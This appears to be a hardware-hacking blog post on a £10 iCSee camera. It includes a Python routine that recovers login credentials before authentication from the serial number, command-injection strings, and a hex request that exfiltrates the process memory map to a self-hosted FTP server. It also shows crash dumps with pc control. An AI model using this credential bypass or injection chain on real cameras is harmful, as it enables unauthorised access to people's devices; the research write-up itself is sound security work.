---
published: true
title: "🎥 [5] Different Camera, Same App"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Exploitation
  - Memory Corruption
  - Command Injection
tagline: "I had a quick look on eBay for cameras that use the same App to see if these bugs impact all iCSee cameras, I found this one for £10 which is a STEAL. Lets see if our bugs work on it."
excerpt: "Do these bugs impact other cameras?"
windowGradientStart: rgb(59, 59, 59)
windowGradientEnd: rgb(22, 22, 22)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(255, 255, 255)
maximizeButton: rgb(0, 0, 255)
closeButton: rgb(255, 0, 0)
---

# Quick Look

I still can't believe this was £10, I honestly thought a picture of the camera would turn up for that price - if you could get some custom firmware on here the value for money would be insane.

I noticed on the listing that the background image used for the screen is identical to the other camera, so I knew these firmware versions would be very similar.

![camera.jpg](/assets/images/video_call_camera_p6/camera.jpg)

## Teardown

I wanted to see how similar the hardware is to the other camera we have, so first things first lets take it to bits.

![front.jpg](/assets/images/video_call_camera_p6/front.jpg)

![back.jpg](/assets/images/video_call_camera_p6/back.jpg)

The main MCU, memory chip, and a few components are definitely different - this is definitely a different revision. However, they have a very similar layout, this one almost looks 'cheaper' than the other. Overall, it looks like a cheaper hardware revision, but they definitely have a strong resemblance to one another. There is also the addition of a battery header that is unused which is interesting.

I hooked up to the UART (which is in the same place as the other device), but once again no activity once booted, and the bootloader has a password - however it does tell us what the CPU is:

![bootlog.png](/assets/images/video_call_camera_p6/bootlog.png)

## Chip Dump

The chip is once again a SOP-8, I figured while I had the device in pieces it makes sense to dump the chip a bit quick and put it back on (while avoiding the tiny resistors that are VERY close to the chip). Nothing interesting to mention here, another job for the XGecu T48.

![chip_gone.jpg](/assets/images/video_call_camera_p6/chip_gone.jpg)

Running binwalk on the extracted filesystem, we get far more extracted bits, but there only seems to be a single squashfs filesystem in **300000**, all the rest is the the Linux kernel and butchered config files:

![extracted_directories.png](/assets/images/video_call_camera_p6/extracted_directories.png)

Interestingly, there is no **App** binary that we had been analysing previously, but there is a **app.sh** script:

```
-bash
#!/bin/sh
/usr/bin/Sofia
touch /mnt/mtd/Config/maintain
echo 1 > /mnt/mtd/Config/RebootAbnormal
cp /var/sofia.log  /mnt/mtd/sofia.log
dmesg > /var/halted.log
date >> /var/halted.log
cat /proc/umap/* >> /var/halted.log
cat /proc/meminfo >> /var/halted.log
tail -c 20480 /var/halted.log > /mnt/mtd/halted.log
```

So it looks like the main binary we are interested in on here is **Sofia**.

# Getting Another Reverse Shell

Now it is time to move on to poking the camera using the script I composed for the previous camera. The first hurdle I came up against is that the credentials we used previously (which we used frida to extract) do not work on the new camera - not ideal! I used frida to cheat and extract the credentials from the App, but I will come back to this and work out how the app is doing it - the extracted credentials for this one (before **XMMD5Encrypt**) are:

| Username | Password | 
| - | - |
| jyfa | k6pyaw |

Cool, so now that we can login, we can look at getting a reverse shell. First I tried the working method of executing the **iperf** script, but this doesn't work!

The reason this doesn't work is that there is already an **iperf** file in **/usr/bin** which takes precedence over the file on the SD card. As it is a read-only filesystem, it isn't like we can delete the file and crack on as normal, so we'll need another method.

If you remember, this wasn't the only bug in this handler, there is also a command injection we can perform as long as there is some sort of **iperf** file present. This bug is actually way better on this device, as you can perform the injection without needing access to the SD card (if you forget about the remote file write we have).

## Command Injection Workaround

It is worth noting at this point that the file write appeared to be working on this camera, so we can use this to upload files/scripts as we did before.

With the files/scripts uploaded, the only difference is instead of sending a normal **RunIperfTest** request to execute the script, we send two requests:
- The first request uses **chmod +x** to make the script executable
- And the second request runs the script

With that implemented, we have our reverse shell back:

![reverse_shell.png](/assets/images/video_call_camera_p6/reverse_shell.png)

# Logging in the Legit Way

Now that we have two camera with different login credentials, and we can run GDB on both, it should be simple enough to work out how to login to the camera without needing to use frida to get the credentials.

While auditing for bugs in the last couple of blogs, I came across the concept of a 'random user'. I'd say the credentials we have seen so far are quite random, they aren't words or anything, so I started there.

## **GetRandomUser**

In the handler for message type *0x67c*, there are a bunch of subhandlers for various functionality, we are interested in the **GetRandomUser** subhandler. Lets send a request and see what it comes back with:

```
-json
{
  "GetRandomUser": {
    "Info": "Vgv4Li9vOiHd0ydApaK6lioLdLndMRRZZiCBTn7lLXs="
  },
  "Name": "GetRandomUser",
  "Ret": 100
}
```

Interesting, so we've got a nice string of base64 that is pretty much guaranteed to be encrypted, lets take a look at the code that generates this. First we can see a string being constructed which contains the username and password (and what looks to be a time?) - this was verified with GDB:

![create_info_string.png](/assets/images/video_call_camera_p6/create_info_string.png)

This then goes into a function that encrypts the data using AES CBC (which was worked out from looking at comments in other places that this function is used).

I couldn't work out where the key was being set, so I went back to trusty GDB for some clues, and found the following keys being used:

| Camera 1 | Camera 2 |
| - | - |
| *929995317992995e* | *6d5950f7816d9506* |

After grepping a few of those sequences, I realised they looked very similar to the serial numbers of the cameras:

| Camera 1 | Camera 2 |
| - | - |
| *d3179929995e3813* | *bf7816d59506ec06* |

It is clear they are using some strange mangled version of the serial number as the key to this encryption function. As we have two key/serial number combos, it wasn't difficult to work out the operations done on the serial number to get to the keys. Here is some simple Python code that generates a key from the serial number:

```
-python
def serial_number_to_key(serial_number):
    key = (
        serial_number[5:9] +
        serial_number[9:11] + 
        serial_number[1:3] +
        serial_number[3:7] + 
        serial_number[8:12]
    )
    
    return key
```

Now that we have the key and the encrypted data, we can write some Python code to decrypt it using AES CBC (at this point I assumed the IV would be null, which turned out to be correct):

```
-python
def decrypt_user_info(encrypted_string, key_string):
    # Convert string key to bytes by encoding as ASCII
    key = key_string.encode('ascii')
    
    # Decode base64 string
    encrypted_data = base64.b64decode(encrypted_string)
    
    # Create cipher object and decrypt
    cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 0x10)
    decrypted = cipher.decrypt(encrypted_data)
    
    # Try to decode without unpadding first
    try:
        return decrypted.decode('utf-8').rstrip('\x00')
    except UnicodeDecodeError:
        # If that fails, try to decode as much as we can
        return decrypted.hex()
```

After all of this, we can now decrypt the info string and get the random credentials without frida!

```
=== GOT AES KEY ===
Serial No: d3179929995e3813
Constructed key: 929995317992995e

...

=== PROCESSING USER CREDS ===
Encrypted: Vgv4Li9vOiHd0ydApaK6lioLdLndMRRZZiCBTn7lLXs=
Key: 929995317992995e
Decrypted: p1:jyfa p2:k6pyaw t:5938

=== GOT RANDOM USER CREDS ===
Username: jyfa
Password: k6pyaw
```

*Note:* There is a check that makes sure the **GetRandomUser** can only be used LAN-side.

## Serial Number?

So, at this stage we are still logging in with the known credentials to hit this handler. At this point, I am getting the serial number with a message that requires authentication (**getSystemInfo**), so I'll need to find a different way to get the serial number. 

I assumed it wouldn't be far away from the **GetRandomUser** subhandler (as it is a requirement to decrypt it), and I came across the **GetDevInfo** subhandler which simply returns the serial number!

```
-json
{
  "GetDevInfo": {
    "SerialNo": "d3179929995e3813"
  },
  "Name": "GetDevInfo",
  "Ret": 100
}
```

The handler that processes both is pre-auth (otherwise how would the app log in), so we no longer need to use frida to get credentials that allow us to log into the camera!

## Full Login Process

Here is a full login process, from being on the same network, to a logged-in session.

![login_summary.png](/assets/images/video_call_camera_p6/login_summary.png)

Nice, so now we have reversed the crypt, we don't have to extract credentials with frida - and this should be usable with any *iCSee* camera!

# Extra Commands

I noticed a few interesting additional sets of commands when I looked through the binary.

Old:

![old_camera_commands.png](/assets/images/video_call_camera_p6/old_camera_commands.png)

New:

![new_camera_commands.png](/assets/images/video_call_camera_p6/new_camera_commands.png)

So the differences are:
- *10CmdsFaceAI* : Suspicious! Seems to be fully featured, but there is a strange flag check at the start of handlers which might block access.
- *10CmdsFeeder* : Probably code left in for some sort of smart pet feeder, mostly stubbed out.
- *14CmdsPgsControl* : This looks like it is for number plate recognition, which is pretty cool - mostly stubbed except some processing of JSON before function.

Looks like a new (and pretty small) attack surface! Lets have a quick poke around.

## Bugs

After a quick audit, I came across a couple of surface level issues - I am sure there are more!

### Stack Overflow 

They just can't get enough of **strcpy** can they! Another trivial overflow in the handler for message type *0x8a6* in *14CmdsPgsControl*.

![pgs_stack_overflow.png](/assets/images/video_call_camera_p6/pgs_stack_overflow.png)

And here is the crash, a straightforward *SIGSEGV* due to us clobbering *r5* with a's:

```
$r0  : 0x6161615d ("]aaa"?)
$r1  : 0xffffffff
$r2  : 0x10f8    
$r3  : 0xb6fcc710  →  <pthread_key_create+0000> ldr r3,  [pc,  #164]	@ 0xb6fcc7bc <pthread_key_create+172>
$r4  : 0x61616155 ("Uaaa"?)
$r5  : 0x6161615d ("]aaa"?)
$r6  : 0xffff0fc0  →  0xf57ff05f
$r7  : 0xffffffff
$r8  : 0x01b68f80  →  0x01b6b0f0  →  0x01ab6208  →  0x01b69790  →  "ble to Int, value:"1"\n\n"
$r9  : 0x0       
$r10 : 0xb2e06b00  →  0x00000001
$r11 : 0x01b6bbf0  →  0x00000001
$r12 : 0xb6f438d0  →  0xb6f26fd4  →  <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::_Rep::_M_dispose(std::allocator<char> const&)+0000> ldr r3,  [pc,  #88]	@ 0xb6f27034 <_ZNSs4_Rep10_M_disposeERKSaIcE+96>
$sp  : 0xb2e064f0  →  0xb6fcc710  →  <pthread_key_create+0000> ldr r3,  [pc,  #164]	@ 0xb6fcc7bc <pthread_key_create+172>
$lr  : 0xb6f27010  →  <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::_Rep::_M_dispose(std::allocator<char> const&)+003c> b 0xb6f27020 <_ZNSs4_Rep10_M_disposeERKSaIcE+76>
$pc  : 0xb6f2a9cc  →   ldr r4,  [r5]
$cpsr: [NEGATIVE zero CARRY overflow interrupt fast thumb]
```

### OOB-Write of Null Byte

I wasn't able to PoC this one, but it is a pretty obvious bug that might work on another device (unless I can figure out how to make it work) - it looks like it might have been stubbed on this camera.

This is in the handler for message type *0xbc6* in *10CmdsFaceAI*:

![faceai_oob_write.png](/assets/images/video_call_camera_p6/faceai_oob_write.png)

# Do Other Bugs Work?

I wanted to see if this camera was also impacted by the bugs I discovered on the previous camera, so I fired up GDB and my PoC's and put this table together:

![bugs.png](/assets/images/video_call_camera_p6/bugs.png)

As you can see, a lot of the bugs we found in the previous camera also work on the new camera, which is great!

## No Canaries!

It is worth saying at this point, that this device doesn't have stack canaries! Which means a decent amount of those stack overflows we discovered in the other camera might be feasible for exploits. Here is an example of a bug we have previously discovered (which was mitigated by the canaries) that now gets control of *pc*.

```
$r0  : 0x0       
$r1  : 0x0132a7cd  →  0x08b6e000
$r2  : 0xe97afdb4
$r3  : 0xe97afdb4
$r4  : 0x61616161 ("aaaa"?)
$r5  : 0x61616161 ("aaaa"?)
$r6  : 0x61616161 ("aaaa"?)
$r7  : 0x013bf950  →  0x005c7198  →  0x001a3b34  →   adds r0,  #20
$r8  : 0xb2cb0778  →  0x00000000
$r9  : 0x0       
$r10 : 0xb2cb0b00  →  0x00000001
$r11 : 0x013bba98  →  0x00000001
$r12 : 0x0       
$sp  : 0xb2cb00b0  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$lr  : 0x00081280  →   movs r3,  r0
$pc  : 0x61616160 ("`aaa"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast THUMB]
```

# Trying (and Failing) to Port Exploits

Now that we have some working bugs and no canaries, getting code execution within Sofia should be a piece of cake (famous last words)! Lets exploit a stack overflow that was not exploitable on the old camera. 

I went with the stack overflow in the handler for *0x43a*, here is the crash for that now that we do not have to worry about canaries:

```
Thread 40 "NetIPManager" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 601.706]
0x61616160 in ?? ()

$r0  : 0xb2d3a468  →  0x00c9c8ec  →  0x00c9c818  →  0x00c9ca20  →  0x00000000
$r1  : 0x1       
$r2  : 0x8b7c881d
$r3  : 0x8b7c881d
$r4  : 0x61616161 ("aaaa"?)
$r5  : 0x61616161 ("aaaa"?)
$r6  : 0x61616161 ("aaaa"?)
$r7  : 0x00029a2c  →   eors r0,  r6
$r8  : 0xb2d3a778  →  0x00000000
$r9  : 0x0       
$r10 : 0xb2d3ab00  →  0x0000000b
$r11 : 0x00f3ca98  →  0x00000001
$r12 : 0xb6f1eecc  →  0x8b7c881d
$sp  : 0xb2d3a5e8  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$lr  : 0x0       
$pc  : 0x61616160 ("`aaa"?)
$cpsr: [negative ZERO CARRY overflow interrupt fast THUMB]
```

As a quick refresher, we are exploiting the **memcpy** overflow in this snippet:

![chosen_overflow.png](/assets/images/video_call_camera_p6/chosen_overflow.png)

Due the the **strchr** which searches for the '.' character, and the fact this is used to calculate how much to overflow, we need to ensure there are no null characters in our payload. It should be possible to overwrite the first 3 bytes of the address loaded into *pc*, and point it to jump elsewhere without requiring a memory leak.

We should be able to jump to the global buffers for the HTTP shenanigans again, and use this to jump to the larger HTTP buffer payload as before, let me just double check the memory is executable:

```
Start Addr   End Addr       Size     Offset  Perms   objfile
	    0x8000   0x68b000   0x683000        0x0  r-xp   /usr/bin/Sofia
	  0x693000   0x6cb000    0x38000   0x683000  rw-p   /usr/bin/Sofia
	  0x6cb000   0x95b000   0x290000        0x0  rw-p   
	  0xfe2000  0x12b4000   0x2d2000        0x0  rw-p   [heap]
...
```

Uh oh, looks like they learned how to use NX :( Looks like we (unfortunately) need a new strategy!

## Getting the Memory Map

As this binary now uses NX and we are using a string based bug (therefore no null terminators), we'll need to find gadgets in the imported shared objects in memory (as these are ASLR'd so their addresses probably won't contain zeros).

### Primitives

- **Command Injection**: I decided using the command injection to exfill the **maps** file for the process would be easiest, we can run mutiple commands so should be able to move files around
- **FTP Log Read**: One of the handlers with two stack overflows in (**0x7d8**) actually allows me to export the **/mnt/mtd/Log/Log** file to a self-hosted FTP server which will be handy for exporting the **maps** file

### **maps** Exfil

This ended up being quite simple to pull of with the following steps.

First, use the command injection to run the following commands (the full **ServerAddr** is presented below to demonstrate the injection):
```
192.168.1.100 & ps aux | grep Sofia > /tmp/p1 &
192.168.1.100 & cat /tmp/p1 | grep -v grep > /tmp/p2 &
192.168.1.100 & cat /tmp/p2 | cut -c3-5 > /tmp/pid &
192.168.1.100 & cat /proc/`cat /tmp/pid`/maps > /tmp/map &
192.168.1.100 & cp /tmp/map /mnt/mtd/Log/Log &
```

This process finds the *pid* of the **Sofia** binary, and copies the **maps** file into the **/mnt/mtd/Log/Log** file so it can be exported.

I came up against the following challenges during this process:
- The size of the injection is limited, hence the commands are split up and small names are used
- *$* is a bad character as well as a few others, which was particularly annoying for the fourth injection (but luckily \` was fine to use)

I then got the FTP server hosted and working, which allowed the camera to connect and upload to the **Test** directory within the main FTP directory, here is the thread implementation so it can be used without needing to run another script:

```
-python
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import threading
import time


class FTPServerThread(threading.Thread):
    def __init__(self, host="0.0.0.0", port=9898):
        super().__init__()
        self.host = host
        self.port = port
        self.server = None
        self._stop_event = threading.Event()
        
    def run(self):
        authorizer = DummyAuthorizer()
        authorizer.add_user("uname", "pword", "FTPTestDir", perm="elradfmw")
        handler = FTPHandler
        handler.authorizer = authorizer
        self.server = FTPServer((self.host, self.port), handler)
        
        while not self._stop_event.is_set():
            self.server.serve_forever(timeout=0.2, blocking=True)
            
    def stop(self):
        self._stop_event.set()
        if self.server:
            self.server.close_all()
```

Make sure there is a **Test** directory within **FTPTestDir** otherwise the upload will not work, and also make sure you send the FTP request in the same session as the command injection requests, as the login will cause the copied **maps** file to be overwritten with the actual log again.

You can trigger the upload with the following request:

```
00000000  ff 01 00 00  9f 86 01 00  9f 86 01 00  00 00 d8 07  │····│····│····│····│
00000010  90 00 00 00  7b 22 4e 61  6d 65 22 3a  20 22 46 54  │····│{"Na│me":│ "FT│
00000020  50 22 2c 20  22 46 54 50  22 3a 20 7b  22 53 65 72  │P", │"FTP│": {│"Ser│
00000030  76 65 72 22  3a 20 7b 22  4e 61 6d 65  22 3a 20 22  │ver"│: {"│Name│": "│
00000040  31 39 32 2e  31 36 38 2e  31 38 38 2e  34 22 2c 20  │192.│168.│188.│4", │
00000050  22 50 6f 72  74 22 3a 20  39 38 39 38  2c 20 22 55  │"Por│t": │9898│, "U│
00000060  73 65 72 4e  61 6d 65 22  3a 20 22 75  6e 61 6d 65  │serN│ame"│: "u│name│
00000070  22 2c 20 22  50 61 73 73  77 6f 72 64  22 3a 20 22  │", "│Pass│word│": "│
00000080  70 77 6f 72  64 22 7d 7d  2c 20 22 53  65 73 73 69  │pwor│d"}}│, "S│essi│
00000090  6f 6e 49 44  22 3a 20 22  30 78 30 30  30 30 30 30  │onID│": "│0x00│0000│
000000a0  30 34 22 7d                                         │04"}│
000000a4
```

And now we have the **maps** file for the process, giving us the addresses of all of the shared objects, allowing us to find gadgets.

```
=== MEMORY MAP ===
00008000-0068b000 r-xp 00000000 1f:03 54         /usr/bin/Sofia
00693000-006cb000 rw-p 00683000 1f:03 54         /usr/bin/Sofia
006cb000-0095b000 rw-p 00000000 00:00 0 
010c8000-01382000 rw-p 00000000 00:00 0          [heap]
aff02000-aff37000 rw-s 82d3e000 00:0a 131        /dev/mmz
aff37000-aff38000 ---p 00000000 00:00 0 
aff38000-b0037000 rw-p 00000000 00:00 0          [stack:800]
b0037000-b0038000 ---p 00000000 00:00 0 
b0038000-b0137000 rw-p 00000000 00:00 0          [stack:799]
b0137000-b0138000 ---p 00000000 00:00 0 
b0138000-b0237000 rw-p 00000000 00:00 0          [stack:795]
b0237000-b0238000 ---p 00000000 00:00 0 
b0238000-b0337000 rw-p 00000000 00:00 0          [stack:781]
b0337000-b0338000 ---p 00000000 00:00 0 
b0338000-b0437000 rw-p 00000000 00:00 0          [stack:780]
b0437000-b0438000 ---p 00000000 00:00 0 
b0438000-b0537000 rw-p 00000000 00:00 0          [stack:764]
b0537000-b0538000 ---p 00000000 00:00 0 
b0538000-b0737000 rw-p 00000000 00:00 0          [stack:743]
b0737000-b07a0000 rw-s 83a52000 00:0a 131        /dev/mmz
b07d5000-b07d6000 ---p 00000000 00:00 0 
b07d6000-b08d5000 rw-p 00000000 00:00 0          [stack:742]
b08d5000-b08d6000 ---p 00000000 00:00 0 
b08d6000-b09d5000 rw-p 00000000 00:00 0          [stack:741]
b09d5000-b09d6000 rw-s 83a51000 00:0a 131        /dev/mmz
b09d6000-b09d7000 rw-s 83a50000 00:0a 131        /dev/mmz
b09d7000-b09da000 rw-s 83a4d000 00:0a 131        /dev/mmz
b09da000-b09db000 rw-s 83a4c000 00:0a 131        /dev/mmz
b09db000-b09dc000 rw-s 83a4b000 00:0a 131        /dev/mmz
b09dc000-b0b26000 rw-s 83900000 00:0a 131        /dev/mmz
b0b26000-b0b27000 ---p 00000000 00:00 0 
b0b27000-b0c26000 rw-p 00000000 00:00 0          [stack:725]
b0c26000-b0c27000 ---p 00000000 00:00 0 
b0c27000-b0d26000 rw-p 00000000 00:00 0          [stack:724]
b0d26000-b0d27000 ---p 00000000 00:00 0 
b0d27000-b0e26000 rw-p 00000000 00:00 0          [stack:723]
b0e26000-b0e27000 ---p 00000000 00:00 0 
b0e27000-b0f26000 rw-p 00000000 00:00 0          [stack:722]
b0f26000-b0f96000 rw-s 83890000 00:0a 131        /dev/mmz
b0f96000-b0f9e000 rw-s 83888000 00:0a 131        /dev/mmz
b0f9e000-b0fa1000 rw-s 83885000 00:0a 131        /dev/mmz
b0fa1000-b0fa2000 ---p 00000000 00:00 0 
b0fa2000-b11a1000 rw-p 00000000 00:00 0          [stack:721]
b11a1000-b11a2000 ---p 00000000 00:00 0 
b11a2000-b153b000 rw-p 00000000 00:00 0          [stack:720]
b153b000-b153c000 ---p 00000000 00:00 0 
b153c000-b1a55000 rw-p 00000000 00:00 0          [stack:718]
b1a55000-b1a56000 rw-s 83884000 00:0a 131        /dev/mmz
b1a56000-b1a57000 ---p 00000000 00:00 0 
b1a57000-b1c56000 rw-p 00000000 00:00 0          [stack:717]
b1c56000-b1c81000 rw-s 83859000 00:0a 131        /dev/mmz
b1c81000-b1c82000 ---p 00000000 00:00 0 
b1c82000-b1e81000 rw-p 00000000 00:00 0          [stack:716]
b1e81000-b1e82000 ---p 00000000 00:00 0 
b1e82000-b2081000 rw-p 00000000 00:00 0          [stack:715]
b2081000-b2082000 ---p 00000000 00:00 0 
b2082000-b2181000 rw-p 00000000 00:00 0          [stack:714]
b2181000-b2182000 ---p 00000000 00:00 0 
b2182000-b2281000 rw-p 00000000 00:00 0          [stack:713]
b2281000-b2282000 ---p 00000000 00:00 0 
b2282000-b2481000 rw-p 00000000 00:00 0          [stack:712]
b2481000-b2482000 ---p 00000000 00:00 0 
b2482000-b2681000 rw-p 00000000 00:00 0          [stack:711]
b2681000-b2682000 ---p 00000000 00:00 0 
b2682000-b2781000 rw-p 00000000 00:00 0          [stack:710]
b2781000-b2782000 ---p 00000000 00:00 0 
b2782000-b2881000 rw-p 00000000 00:00 0          [stack:709]
b2881000-b2882000 ---p 00000000 00:00 0 
b2882000-b2981000 rw-p 00000000 00:00 0          [stack:708]
b2981000-b2982000 ---p 00000000 00:00 0 
b2982000-b2a81000 rw-p 00000000 00:00 0          [stack:707]
b2a81000-b2a82000 ---p 00000000 00:00 0 
b2a82000-b2b81000 rw-p 00000000 00:00 0          [stack:706]
b2b81000-b2b82000 ---p 00000000 00:00 0 
b2b82000-b2c81000 rw-p 00000000 00:00 0          [stack:705]
b2c81000-b2c82000 ---p 00000000 00:00 0 
b2c82000-b2ca3000 rw-p 00000000 00:00 0          [stack:704]
b2ca3000-b2ca4000 ---p 00000000 00:00 0 
b2ca4000-b2da3000 rw-p 00000000 00:00 0          [stack:703]
b2da3000-b2da4000 ---p 00000000 00:00 0 
b2da4000-b2ea3000 rw-p 00000000 00:00 0          [stack:702]
b2ea3000-b2ea4000 rw-s 83858000 00:0a 131        /dev/mmz
b2ea4000-b2ea5000 ---p 00000000 00:00 0 
b2ea5000-b2fa4000 rw-p 00000000 00:00 0          [stack:701]
b2fa4000-b2fa5000 ---p 00000000 00:00 0 
b2fa5000-b30a4000 rw-p 00000000 00:00 0          [stack:700]
b30a4000-b30a5000 ---p 00000000 00:00 0 
b30a5000-b31a4000 rw-p 00000000 00:00 0          [stack:699]
b31a4000-b31ef000 rw-s 8380b000 00:0a 131        /dev/mmz
b31ef000-b31f0000 ---p 00000000 00:00 0 
b31f0000-b32ef000 rw-p 00000000 00:00 0          [stack:691]
b32ef000-b32f0000 ---p 00000000 00:00 0 
b32f0000-b33ef000 rw-p 00000000 00:00 0          [stack:690]
b33ef000-b33f0000 ---p 00000000 00:00 0 
b33f0000-b34ef000 rw-p 00000000 00:00 0          [stack:689]
b34ef000-b34f0000 ---p 00000000 00:00 0 
b34f0000-b35ef000 rw-p 00000000 00:00 0          [stack:688]
b35ef000-b35f0000 ---p 00000000 00:00 0 
b35f0000-b36ef000 rw-p 00000000 00:00 0          [stack:687]
b36ef000-b36f0000 ---p 00000000 00:00 0 
b36f0000-b37ef000 rw-p 00000000 00:00 0          [stack:686]
b37ef000-b37f0000 ---p 00000000 00:00 0 
b37f0000-b39ef000 rw-p 00000000 00:00 0          [stack:685]
b39ef000-b39f0000 ---p 00000000 00:00 0 
b39f0000-b3aef000 rw-p 00000000 00:00 0          [stack:684]
b3aef000-b3af0000 ---p 00000000 00:00 0 
b3af0000-b3cef000 rw-p 00000000 00:00 0          [stack:683]
b3cef000-b3cf0000 ---p 00000000 00:00 0 
b3cf0000-b3eef000 rw-p 00000000 00:00 0 
b3eef000-b3f1b000 rw-s 837d8000 00:0a 131        /dev/mmz
b3f1b000-b3f1c000 ---p 00000000 00:00 0 
b3f1c000-b411b000 rw-p 00000000 00:00 0          [stack:681]
b411b000-b4167000 rw-s 8378c000 00:0a 131        /dev/mmz
b4167000-b419d000 rw-s 83756000 00:0a 131        /dev/mmz
b419d000-b4208000 rw-s 836eb000 00:0a 131        /dev/mmz
b4208000-b42d1000 rw-s 83622000 00:0a 131        /dev/mmz
b42d1000-b445d000 rw-s 83495000 00:0a 131        /dev/mmz
b445d000-b4775000 rw-s 8317c000 00:0a 131        /dev/mmz
b4775000-b4776000 ---p 00000000 00:00 0 
b4776000-b4975000 rw-p 00000000 00:00 0          [stack:680]
b4975000-b4976000 ---p 00000000 00:00 0 
b4976000-b4b75000 rw-p 00000000 00:00 0          [stack:679]
b4b75000-b4b76000 ---p 00000000 00:00 0 
b4b76000-b4d75000 rw-p 00000000 00:00 0          [stack:678]
b4d75000-b4d76000 ---p 00000000 00:00 0 
b4d76000-b4e75000 rw-p 00000000 00:00 0          [stack:677]
b4e75000-b4e76000 ---p 00000000 00:00 0 
b4e76000-b5075000 rw-p 00000000 00:00 0          [stack:663]
b5075000-b5076000 ---p 00000000 00:00 0 
b5076000-b5175000 rw-p 00000000 00:00 0          [stack:662]
b5175000-b5176000 ---p 00000000 00:00 0 
b5176000-b5375000 rw-p 00000000 00:00 0 
b5375000-b5376000 ---p 00000000 00:00 0 
b5376000-b5575000 rw-p 00000000 00:00 0          [stack:660]
b5575000-b5576000 ---p 00000000 00:00 0 
b5576000-b5775000 rw-p 00000000 00:00 0          [stack:659]
b5775000-b5776000 ---p 00000000 00:00 0 
b5776000-b5875000 rw-p 00000000 00:00 0          [stack:658]
b5875000-b5876000 ---p 00000000 00:00 0 
b5876000-b5a75000 rw-p 00000000 00:00 0          [stack:647]
b5a75000-b5a76000 ---p 00000000 00:00 0 
b5a76000-b5b75000 rw-p 00000000 00:00 0          [stack:629]
b5b75000-b5b76000 ---p 00000000 00:00 0 
b5b76000-b5d75000 rw-p 00000000 00:00 0          [stack:623]
b5d75000-b5d76000 ---p 00000000 00:00 0 
b5d76000-b6276000 rw-p 00000000 00:00 0          [stack:622]
b6276000-b6277000 ---p 00000000 00:00 0 
b6277000-b6376000 rw-p 00000000 00:00 0          [stack:621]
b6376000-b6377000 ---p 00000000 00:00 0 
b6377000-b6476000 rw-p 00000000 00:00 0          [stack:620]
b6476000-b6477000 ---p 00000000 00:00 0 
b6477000-b6576000 rw-p 00000000 00:00 0          [stack:619]
b6576000-b6577000 ---p 00000000 00:00 0 
b6577000-b6676000 rw-p 00000000 00:00 0          [stack:611]
b6676000-b6677000 ---p 00000000 00:00 0 
b6677000-b6776000 rw-p 00000000 00:00 0          [stack:607]
b6776000-b6777000 ---p 00000000 00:00 0 
b6777000-b6976000 rw-p 00000000 00:00 0          [stack:604]
b6976000-b6977000 ---p 00000000 00:00 0 
b6977000-b6b76000 rw-p 00000000 00:00 0          [stack:603]
b6b76000-b6b77000 ---p 00000000 00:00 0 
b6b77000-b6d76000 rw-p 00000000 00:00 0          [stack:602]
b6d76000-b6dcd000 r-xp 00000000 1f:02 894792     /lib/libuClibc-0.9.33.3-git.so
b6dcd000-b6dd4000 ---p 00000000 00:00 0 
b6dd4000-b6dd5000 r--p 00056000 1f:02 894792     /lib/libuClibc-0.9.33.3-git.so
b6dd5000-b6dd6000 rw-p 00057000 1f:02 894792     /lib/libuClibc-0.9.33.3-git.so
b6dd6000-b6dda000 rw-p 00000000 00:00 0 
b6dda000-b6df6000 r-xp 00000000 1f:02 533968     /lib/libgcc_s.so.1
b6df6000-b6dfd000 ---p 00000000 00:00 0 
b6dfd000-b6dfe000 rw-p 0001b000 1f:02 533968     /lib/libgcc_s.so.1
b6dfe000-b6e09000 r-xp 00000000 1f:02 576080     /lib/libm-0.9.33.3-git.so
b6e09000-b6e10000 ---p 00000000 00:00 0 
b6e10000-b6e11000 r--p 0000a000 1f:02 576080     /lib/libm-0.9.33.3-git.so
b6e11000-b6e12000 rw-p 0000b000 1f:02 576080     /lib/libm-0.9.33.3-git.so
b6e12000-b6eac000 r-xp 00000000 1f:02 647344     /lib/libstdc++.so.6.0.20
b6eac000-b6eb3000 ---p 00000000 00:00 0 
b6eb3000-b6eb7000 r--p 00099000 1f:02 647344     /lib/libstdc++.so.6.0.20
b6eb7000-b6eb9000 rw-p 0009d000 1f:02 647344     /lib/libstdc++.so.6.0.20
b6eb9000-b6ec0000 rw-p 00000000 00:00 0 
b6ec0000-b6ec6000 r-xp 00000000 1f:03 45         /usr/lib/libjson.so.0
b6ec6000-b6ecd000 ---p 00000000 00:00 0 
b6ecd000-b6ece000 rw-p 00005000 1f:03 45         /usr/lib/libjson.so.0
b6ece000-b6ed1000 r-xp 00000000 1f:02 527904     /lib/libdl-0.9.33.3-git.so
b6ed1000-b6ed8000 ---p 00000000 00:00 0 
b6ed8000-b6ed9000 r--p 00002000 1f:02 527904     /lib/libdl-0.9.33.3-git.so
b6ed9000-b6eda000 rw-p 00003000 1f:02 527904     /lib/libdl-0.9.33.3-git.so
b6eda000-b6f08000 r-xp 00000000 1f:03 42         /usr/lib/libdvr.so
b6f08000-b6f10000 ---p 00000000 00:00 0 
b6f10000-b6f11000 rw-p 0002e000 1f:03 42         /usr/lib/libdvr.so
b6f11000-b6f1d000 rw-p 00000000 00:00 0 
b6f1d000-b6f2a000 r-xp 00000000 1f:03 41         /usr/lib/libXMcrypto.so
b6f2a000-b6f32000 ---p 00000000 00:00 0 
b6f32000-b6f33000 rw-p 0000d000 1f:03 41         /usr/lib/libXMcrypto.so
b6f33000-b6f46000 r-xp 00000000 1f:02 602296     /lib/libpthread-0.9.33.3-git.so
b6f46000-b6f4d000 ---p 00000000 00:00 0 
b6f4d000-b6f4e000 r--p 00012000 1f:02 602296     /lib/libpthread-0.9.33.3-git.so
b6f4e000-b6f4f000 rw-p 00013000 1f:02 602296     /lib/libpthread-0.9.33.3-git.so
b6f4f000-b6f51000 rw-p 00000000 00:00 0 
b6f51000-b6f57000 r-xp 00000000 1f:02 506072     /lib/ld-uClibc-0.9.33.3-git.so
